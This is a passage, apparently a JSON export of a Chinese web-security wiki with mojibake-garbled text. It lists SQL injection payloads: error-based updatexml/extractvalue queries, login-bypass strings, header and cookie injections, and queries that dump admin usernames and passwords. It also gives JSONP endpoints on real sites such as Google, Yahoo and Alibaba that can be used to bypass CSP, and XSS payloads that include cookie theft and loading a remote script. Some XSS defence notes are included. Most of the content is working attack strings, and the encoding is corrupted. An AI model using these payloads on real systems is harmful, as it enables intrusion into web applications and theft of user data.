2ã€é€šè¿‡ExtractValueæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3ã€é€šè¿‡UpdateXmlæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and 1(updatexml(1,concat(0x3a,(select user())),1)) 4ã€é€šè¿‡NAME_CONSTæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and exists(select_from (select_from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5ã€é€šè¿‡joinæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: select * from(select * from mysql.user ajoin mysql.user b)c; 6ã€é€šè¿‡expæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and exp(~(select * from (select user () ) a) ); 7ã€é€šè¿‡GeometryCollection()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and GeometryCollection(()select *from(select user () )a)b ); 8ã€é€šè¿‡polygon ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and polygon (()select * from(select user ())a)b ); 9ã€é€šè¿‡multipoint ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and multipoint (()select * from(select user() )a)b ); 10ã€é€šè¿‡multlinestring ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and multlinestring (()select * from(selectuser () )a)b ); 11ã€é€šè¿‡multpolygon ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and multpolygon (()select * from(selectuser () )a)b ); 12ã€é€šè¿‡linestring ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and linestring (()select * from(select user() )a)b ); å…³äºPOSTæ³¨å…¥ å¸¸ç”¨çš„ä¸‡èƒ½usernameè¯­å¥ï¼š a â€™ or 11 # a â€œ) or 11 # aâ€˜) or 11 # aâ€ or â€œ1â€â€1 â€˜ or â€˜1â€™â€™1 â€˜ or (length(database())) 8 (ç”¨äºè¾“å…¥â€™ â€œéƒ½æ²¡æœ‰é”™è¯¯) â€˜ or (ascii(substr((select database()) ,1,1))) 115 # (ç”¨äºè¾“å…¥â€™ â€œéƒ½æ²¡æœ‰é”™è¯¯) â€œ) or (â€œ1â€)(â€œ1 â€œ) or 11 or if(11, sleep(1), null) # â€œ) or (length(database())) 8 # â€œ) or (ascii(substr((select database()) ,1,1))) 115 or if(11, sleep(1), null) # postå‹ç›²æ³¨é€šæ€payloadï¼š unameadmin%dfâ€™or()or%200%23passwdsubmitSubmit. ä¸‡èƒ½å¯†ç  ï¿½â€™or11# å…³äºUPDATEXML,REFERER,COOKIEçš„æ„é€  User-Agent:â€¦â€¦â€¦ or updatexml(1,concat(0x7e,database(),0x7e),1),â€,â€) # Referer: â€™ or updatexml(1,concat(0x7e,database(),0x7e),1),â€,â€) # Cookie:username: admin â€™ or updatexml(1,concat(0x7e,database(),0x7e),1) # updatexmlæŠ¥é”™æ³¨å…¥ çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) é“¾æ¥ç”¨æˆ·ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) é“¾æ¥æ•°æ®åº“ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) çˆ†åº“ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1) çˆ†è¡¨ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1) çˆ†å­—æ®µï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1) çˆ†å­—æ®µå†…å®¹ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)"},{"title":"xss","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/index.html","content":"JSONP ç»•è¿‡ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ JSONPç»•è¿‡ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ xssç»•è¿‡ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ ç»•è¿‡ CSP é»˜è®¤æº ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ ç»•è¿‡CSPé»˜è®¤æº ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"JSONPç»•è¿‡","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/JSONPç»•è¿‡.html","content":"JSONP ç»•è¿‡Google.com script+src=https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)/scriptscript+src=https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)/scriptscript+src=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)/scriptscript+src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)/scriptscript src=https://www.google.com/complete/search?client=chromeq=hellocallback=alert#1/script Blogger.com script src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/scriptscript+src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/script VK.com script+src=http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()/scriptscript+src=http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()/script AlibabaGroup script+src=https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)/scriptscript+src=https://suggest.taobao.com/sug?callback=alert(1337)/scriptscript+src=https://count.tbcdn.cn//counter3?callback=alert(1337)/scriptscript+src=https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)/scriptscript+src=https://wb.amap.com/channel.php?callback=alert(1337)/scriptscript+src=http://a.sm.cn/api/getgamehotboarddata?format=jsonppage=1_=1537365429621callback=confirm(1);jsonp1/scriptscript+src=http://api.m.sm.cn/rest?method=tools.sidercallback=jsonp_1869510867%3balert(1)%2f%2f794/script Uber.com â€œscript+srcâ€https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain); AOLYahoo script+src=https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?cb=alert(1337)/scriptscript+src=https://mempf.yahoo.co.jp/offer?position=hcallback=alert(1337)/scriptscript+src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1)//appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfoliosporttype=2portmax=5rf=http://www.dailyfinance.comcallback=jsonCallback24098%3balert(1)%2f%2f476_=1537149044679/scriptscript+src=https://api.cmi.aol.com/content/alert/homepage-alert?site=usaolcallback=confirm(1);//jQuery20108887725116629929_1528071050373472232_=1528071050374/scriptscript+src=https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504_=1528071050378/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooterchannel=financeportfolios=truedomain=portfolioscollapsed=1callback=confirm(9)//jQuery21307555521146732187_1538371213486_=1538371213487/scriptscript+src=http://portal.pf.aol.com/jsonmfus/?service=myportfolios,porttype=1portmax=100callback=confirm(9)//jQuery1710788849030856973_1538354104695_=1538354109053/script Twitter.com script+src=http://search.twitter.com/trends.json?callback=alert()/scriptscript+src=https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()/scriptscript+src=https://twitter.com/status/user_timeline/kbeautysalon.json?count=1callback=confirm()/script Others script+src=https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)/scriptscript+src=https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)/scriptscript+src=https://passport.ngs.ru/ajax/check?callback=alert(1337)/scriptscript+src=https://ulogin.ru/token.php?callback=alert(1337)/scriptscript+src=https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)/scriptscript+src=https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)/scriptscript+src=https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)/scriptscript+src=https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)/scriptscript+src=https://api.mixpanel.com/track/?callback=alert(1337)/scriptscript+src=https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)/scriptscript+src=http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json/scriptscript+src=https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38/script#GoogleAPIsembed src=//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\)))catch(e)alert(1337)// allowscriptaccess=alwaysscript src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337/scriptng-appng-csp ng-click=$event.view.alert(1337)script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js/script#Yandex:script+src=https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)/scriptscript+src=https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert/script æ›´æ–°: 2025-10-29 21:10:16åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/gafr9v1lugv9t89x"},{"title":"JSONP ç»•è¿‡","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/JSONP ç»•è¿‡.html","content":"Google.com script+src=https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)/scriptscript+src=https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)/scriptscript+src=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)/scriptscript+src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)/scriptscript src=https://www.google.com/complete/search?client=chromeq=hellocallback=alert#1/script Blogger.com script src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/scriptscript+src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/script VK.com script+src=http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()/scriptscript+src=http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()/script AlibabaGroup script+src=https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)/scriptscript+src=https://suggest.taobao.com/sug?callback=alert(1337)/scriptscript+src=https://count.tbcdn.cn//counter3?callback=alert(1337)/scriptscript+src=https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)/scriptscript+src=https://wb.amap.com/channel.php?callback=alert(1337)/scriptscript+src=http://a.sm.cn/api/getgamehotboarddata?format=jsonppage=1_=1537365429621callback=confirm(1);jsonp1/scriptscript+src=http://api.m.sm.cn/rest?method=tools.sidercallback=jsonp_1869510867%3balert(1)%2f%2f794/script Uber.com â€œscript+srcâ€https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain); AOLYahoo script+src=https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?cb=alert(1337)/scriptscript+src=https://mempf.yahoo.co.jp/offer?position=hcallback=alert(1337)/scriptscript+src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1)//appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfoliosporttype=2portmax=5rf=http://www.dailyfinance.comcallback=jsonCallback24098%3balert(1)%2f%2f476_=1537149044679/scriptscript+src=https://api.cmi.aol.com/content/alert/homepage-alert?site=usaolcallback=confirm(1);//jQuery20108887725116629929_1528071050373472232_=1528071050374/scriptscript+src=https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504_=1528071050378/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooterchannel=financeportfolios=truedomain=portfolioscollapsed=1callback=confirm(9)//jQuery21307555521146732187_1538371213486_=1538371213487/scriptscript+src=http://portal.pf.aol.com/jsonmfus/?service=myportfolios,porttype=1portmax=100callback=confirm(9)//jQuery1710788849030856973_1538354104695_=1538354109053/script Twitter.com script+src=http://search.twitter.com/trends.json?callback=alert()/scriptscript+src=https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()/scriptscript+src=https://twitter.com/status/user_timeline/kbeautysalon.json?count=1callback=confirm()/script Others script+src=https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)/scriptscript+src=https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)/scriptscript+src=https://passport.ngs.ru/ajax/check?callback=alert(1337)/scriptscript+src=https://ulogin.ru/token.php?callback=alert(1337)/scriptscript+src=https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)/scriptscript+src=https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)/scriptscript+src=https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)/scriptscript+src=https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)/scriptscript+src=https://api.mixpanel.com/track/?callback=alert(1337)/scriptscript+src=https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)/scriptscript+src=http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json/scriptscript+src=https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38/script#GoogleAPIsembed src=//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\)))catch(e)alert(1337)// allowscriptaccess=alwaysscript src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337/scriptng-appng-csp ng-click=$event.view.alert(1337)script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js/script#Yandex:script+src=https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)/scriptscript+src=https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert/script"},{"title":"xssç»•è¿‡","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/xssç»•è¿‡.html","content":"XSSç»•è¿‡æ€»ç»“ä¸€ã€åˆ†ç±»åå°„æ€§XSSå­˜å‚¨å‹XSSDOMå‹XSS åå°„å‹xss æ”»å‡»æ–¹å¼ æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å°†åŒ…å«XSSä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥å—è¯¥ç›®æ ‡ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œç„¶åæœåŠ¡å™¨æŠŠå¸¦æœ‰XSSçš„ä»£ç å‘é€ç»™ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ¶æ„è„šæœ¬åï¼Œå°±ä¼šè§¦å‘XSSæ¼æ´ã€‚ æ”»å‡»æ­¥éª¤ 1.æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç .2.ç”¨æˆ·æ‰“å¼€æœ‰æ¶æ„ä»£ç çš„URLæ—¶ï¼Œç½‘ç«™æœåŠ¡å™¨ç«¯å°†æ¶æ„ä»£ç ä»URLå–å‡ºï¼Œæ‹¼æ¥åœ¨HTMLè¿”å›ç»™æµè§ˆå™¨.3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ é˜²å¾¡åå°„å‹æ”»å‡» 1.å¯¹è¾“å…¥æ£€æŸ¥å¯¹è¯·æ±‚å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œä¸€æ—¦å‘ç°å¯ç–‘çš„ç‰¹æ®Šå­—ç¬¦å°±æ‹’ç»è¯·æ±‚ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ç”¨æˆ·å¯ä»¥ç»•è¿‡æµè§ˆå™¨çš„æ£€æŸ¥ï¼Œç›´æ¥é€šè¿‡Postmanç­‰å·¥å…·è¿›è¡Œè¯·æ±‚ï¼Œæ‰€ä»¥è¿™ä¸ªæ£€æŸ¥æœ€å¥½å‰åç«¯éƒ½åšã€‚2.å¯¹è¾“å‡ºè¿›è¡Œè½¬ä¹‰å†æ˜¾ç¤ºé€šè¿‡ä¸Šé¢çš„ä»‹ç»å¯ä»¥çœ‹å‡ºï¼Œåå°„å‹XSSæ”»å‡»è¦è¿›è¡Œæ”»å‡»çš„è¯éœ€è¦åœ¨å‰ç«¯é¡µé¢è¿›è¡Œæ˜¾ç¤ºã€‚æ‰€ä»¥åœ¨è¾“å‡ºæ•°æ®ä¹‹å‰å¯¹æ½œåœ¨çš„å¨èƒçš„å­—ç¬¦è¿›è¡Œç¼–ç ã€è½¬ä¹‰ä¹Ÿæ˜¯é˜²å¾¡XSSæ”»å‡»ååˆ†æœ‰æ•ˆçš„æªæ–½ã€‚ å­˜å‚¨å‹xss æ”»å‡»æ–¹å¼ æ”»å‡»è€…åœ¨å‘å¸–ã€ç•™è¨€ã€è¯„è®ºçš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥åˆ°å‘å¸ƒå†…å®¹ä¸­ã€‚éšç€å‘å¸ƒå†…å®¹è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿå°†æ°¸ä¹…çš„å­˜æ”¾åˆ°æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œã€‚ æ”»å‡»æ­¥éª¤ 1.æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚2.ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨HTMLä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œå‡‹ç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œ.è¿™ç§æ”»å‡»å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œå¦‚è®ºå›å‘å¸–ï¼Œå•†å“è¯„è®ºï¼Œç”¨æˆ·ç§ä¿¡ç­‰ã€‚ é¢„é˜²å­˜å‚¨å‹XSSæ”»å‡» é¢„é˜²å­˜å‚¨å‹XSSæ”»å‡»ä¹Ÿæ˜¯ä»è¾“å…¥å’Œè¾“å‡ºä¸¤ä¸ªæ–¹é¢æ¥è€ƒè™‘ã€‚1.æœåŠ¡å™¨æ¥æ”¶åˆ°æ•°æ®ï¼Œåœ¨å­˜å‚¨åˆ°æ•°æ®åº“ä¹‹å‰ï¼Œè¿›è¡Œè½¬ä¹‰å’Œè¿‡æ»¤å±é™©å­—ç¬¦;2.å‰ç«¯æ¥æ”¶åˆ°æœåŠ¡å™¨ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œåœ¨å±•ç¤ºåˆ°é¡µé¢å‰ï¼Œå…ˆè¿›è¡Œè½¬ä¹‰/è¿‡æ»¤;ä¸è®ºæ˜¯åå°„å‹æ”»å‡»è¿˜æ˜¯å­˜å‚¨å‹ï¼Œæ”»å‡»è€…æ€»éœ€è¦æ‰¾åˆ°ä¸¤ä¸ªè¦ç‚¹ï¼Œå³â€œè¾“å…¥ç‚¹â€ä¸è¾“å‡ºç‚¹ï¼Œä¹Ÿåªæœ‰è¿™ä¸¤è€…éƒ½æ»¡è¶³ï¼ŒXSSæ”»å‡»æ‰ä¼šç”Ÿæ•ˆã€‚â€œè¾“å…¥ç‚¹â€ç”¨äºå‘ webé¡µé¢æ³¨å…¥æ‰€éœ€çš„æ”»å‡»ä»£ç ï¼Œè€Œâ€œè¾“å‡ºç‚¹â€å°±æ˜¯æ”»å‡»ä»£ç è¢«æ‰§è¡Œçš„åœ°æ–¹ã€‚ DOMå‹xss æ”»å‡»æ–¹å¼ ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æä¾›ï¼Œè€Œä¸”å…¶ä¸­åŒ…å«XSSä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ï¼Œå½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSä»£ç ï¼Œå¯¼è‡´å­˜åœ¨XSSæ¼æ´ã€‚/*DOM(Document object model)ï¼Œä½¿ç”¨DOMèƒ½å¤Ÿä½¿ç¨‹åºå’Œè„šæœ¬èƒ½å¤ŸåŠ¨æ€è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ã€ç»“æ„å’Œæ ·å¼ã€‚DOMå‹XSSå…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹XSSï¼Œå®ƒæ˜¯åŸºäºDOMæ–‡æ¡£å¯¹è±¡çš„ä¸€ç§æ¼æ´ã€‚DOMå‹XSSæ˜¯åŸºäºjsä¸Šçš„ï¼Œä¸éœ€è¦ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚*/ æ”»å‡»æ­¥éª¤ 1.æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šæ•°æ®ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚2.ç”¨æˆ·æµè§ˆå™¨æ‰§è¡Œäº†æ¶æ„ä»£ç 3.æ¶æ„çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œ./*DOMå‹XSSæ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯javascriptè‡ªèº«çš„å®‰å…¨æ¼æ´.*/ å…¶ä»–é˜²èŒƒç­–ç•¥ HTTP-only Cookie:ç¦æ­¢JavaScriptè¯»å–æŸäº›æ•æ„ŸCookieï¼Œæ”»å‡»è€…å®ŒæˆXSSæ³¨å…¥åä¹Ÿæ— æ³•çªƒå–æ­¤Cookieå±æ€§ï¼šé˜²æ­¢è„šæœ¬å†’å……ç”¨æˆ·æäº¤å±é™©æ“ä½œ åœ¨æœåŠ¡ç«¯ä½¿ç”¨HTTPçš„Content-Security-Policyå¤´éƒ¨æ¥æŒ‡å®šç­–ç•¥ï¼Œæˆ–è€…åœ¨å‰ç«¯è®¾ç½®metaæ ‡ç­”ã€‚ä¾‹å¦‚åªå…è®¸åŠ è½½åŒåŸŸä¸‹çš„èµ„æº åº”å¯¹XSSæ”»å‡»çš„ä¸»è¦æ‰‹æ®µè¿˜æ˜¯ç¼–ç ä¸è¿‡æ»¤ä¸¤ç§ï¼Œç¼–ç ç”¨äºå°†ç‰¹æ®Šçš„ç¬¦å· â€œã€ã€ã€â€™ã€â€â€è¿›è¡Œhtmlè½¬ä¹‰ï¼Œè€Œè¿‡æ»¤åˆ™æ˜¯é˜»æ­¢ç‰¹å®šçš„æ ‡è®°ã€å±æ€§ã€äº‹ä»¶ã€‚ äºŒã€æ”»å‡»è·è½½alert font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt(1)/font ä¼šå¼¹è¾“å…¥æ¡†ï¼Œç‚¹ç¡®å®šå³ç®—æ‰§è¡Œ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm(1)/font å¼¹ç¡®å®šå–æ¶ˆæ¡† font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open(javascript:alert(1))/font æ—¢å¼¹çª—åˆèƒ½åŠ è½½ä¼ªåè®® font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print()/font è°ƒå‡ºæ‰“å°å¯¹è¯æ¡†ï¼ˆéƒ¨åˆ†æµè§ˆå™¨ï¼‰ scriptæ ‡ç­¾script æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬scriptalert(xss)/script scriptalert(/xss/)/script scriptalert(document.cookie)/script script src=http://xxx.com/xss.js/script svgæ ‡ç­¾svg æ ‡ç­¾ç”¨æ¥åœ¨HTMLé¡µé¢ä¸­ç›´æ¥åµŒå…¥SVG æ–‡ä»¶çš„ä»£ç ã€‚ // ç­‰ä»·äº svg onload=alert(xss)svg onload=alert(xss)// imgæ ‡ç­¾img æ ‡ç­¾å®šä¹‰ HTML é¡µé¢ä¸­çš„å›¾åƒimg src=1 onerror=alert(xss)img src=1 onerror=alert(document.cookie)img src=1 onerror=eval(alert(xss))img src=javascript:alert(xss)img src=javascript:alert(String.formCharCode(88,83,83))img src=1 onmouseover=alert(xss) bodyæ ‡ç­¾body æ 